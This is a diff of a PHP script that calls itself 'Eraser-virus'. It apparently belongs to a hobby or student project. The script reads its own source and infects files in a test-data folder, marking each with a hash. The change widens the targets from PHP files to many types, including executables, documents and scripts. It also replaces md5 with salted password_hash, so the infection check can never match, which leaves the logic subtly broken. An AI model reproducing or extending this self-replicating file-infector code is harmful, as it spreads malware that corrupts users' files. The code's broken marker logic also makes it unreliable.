@@ -5,7 +5,7 @@
         include "Eraser-virus.php";
 
         //get all the filenames with .dev extension thats already saved
-        $filenames = glob('test-data/*.php');
+        $filenames = glob("test-data/*.{jpg,png,gif,jfif,txt,text,docx,pub,doc,ps,pdf,exe,mp3,mp4,html,htm,css,py,c,php,js,r,t,s,JPG,PNG,GIF,jfif,TXT,TEXT,DOCX,PUB,DOC,PS,PDF,EXE,MP3,MP4,HTML,HTM,CSS,PY,C,PHP,JS,R,T,S,}", GLOB_BRACE);
         
         //loop throught all the filesize
         foreach ($filenames as $filename) {
@@ -14,7 +14,7 @@
 
             // check whether the file is infected
             $first_line = fgets($script); // gets first line of the file
-            $virus_hash = md5($filename); //creates a hash 
+            $virus_hash = password_hash($filename, PASSWORD_DEFAULT); //creates a hash 
 
             // check whether the hash appears on the first line of the file
             if(strpos($first_line, $virus_hash) == false){
@@ -42,7 +42,6 @@
                 rename("$filename.infected", $filename);
             }
         }
-    
     }
 
     $virus = file_get_contents(__FILE__);
